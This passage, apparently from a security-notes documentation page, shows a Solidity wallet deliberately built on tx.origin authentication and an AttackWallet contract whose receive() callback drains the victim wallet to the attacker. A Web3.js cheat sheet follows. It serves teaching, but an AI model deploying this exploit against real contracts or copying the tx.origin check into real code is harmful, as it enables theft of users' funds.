+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>contract VulnWallet {
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>    address owner;
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>    constructor() {
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>        owner = msg.sender;
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>    }
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>    function transferTo(address payable _to, uint amount) public {
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>        require(tx.origin == owner);
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>        _to.transfer(amount);
+</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>    }
+</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>}
+</span></code></pre></div>
+<ul>
+<li>
+<ol>
+<li>Implement Attack Wallet using the Vulnerable Wallet</li>
+</ol>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>// SPDX-License-Identifier: GPL-3.0
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>interface VulnWallet {
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>    function transferTo(address payable _to, uint amount) external;
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>}
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>contract AttackWallet {
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>    address payable owner;
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>    constructor() {
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>        owner = payable(msg.sender);
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>    }
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>    receive() external payable {
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>        VulnWallet(msg.sender).transferTo(owner, msg.sender.balance);
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>    }
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>}
+</span></code></pre></div>
+<h1 id="web3js-cheat-sheet">Web3.js Cheat Sheet</h1>
+<ul>
+<li>Blocks</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>// Get block
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>web3.eth.getBlock(&#39;latest&#39;)
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Converting</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>// Wei to Ether
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>web3.utils.fromWei(&#39;1000000000000000000&#39;, &#39;ether&#39;)
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>// &quot;1&quot;
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>// Ether to Wei
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>web3.utils.toWei(&#39;0.001&#39;)
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>// &quot;1000000000000000&quot;
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>// Initialize a contract
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>const tokenAbi = [...]; // JSON interface
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>const tokenAddress = &#39;0x1234...&#39;;
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>const contract = new web3.eth.Contract(tokenAbi, tokenAddress);
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Send Ether to Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>// Send ether to the contract with interacting ABI
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>contract.example({value: web3.utils.toWei(&#39;0.001&#39;)})
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>// Send ether to the contract from outside
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>contract.sendTransaction({value: toWei(&#39;0.0001&#39;)})
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>// Send ether to the contract from outside using `call` function to invoke fallback
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>(bool success,) = payable(_victim_contract_address).call{value: &#39;1.0&#39;}(&quot;&quot;);
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>// Send etehr to the contract from outside by invoking specific function
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>contract.exampleFunc{value: msg.value}(address(this))
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Get Storage of Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>// the second arguement is the index of the storage.
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>web3.eth.getStorageAt(contract.address, 0)
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>web3.eth.getStorageAt(contract.address, 1)
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Function Signature</li>
+</ul>
+<p>We can retrieve a function signature with <code>encodeFunctionSignature</code>.  We can also use it to invoke the contract function via <code>sendTransaction</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>const example = web3.eth.abi.encodeFunctionSignature(&quot;example()&quot;)
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>// We can invoke the function using this signature
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>await web3.eth.sendTransaction({from: userAddress, to: contractAddress, data: example})
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Function Call</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>const myAddress = &quot;0x123...&quot;;
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>const functionSignature = {
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>  name: &#39;exampleFunc&#39;,
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>  type: &#39;function&#39;,
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>  inputs: [{type: &#39;address&#39;, name: &#39;_address&#39;}]
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>}
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>const params = [myAddress]
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>const funcData = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>// Execute the function
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>await web3.eth.sendTransaction({from: myAddress, to: contract.address, funcData})
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Send Ether to Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>// Set a gas value
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>contract.exampleFunc{gas: 100000}()
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/blockchain.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
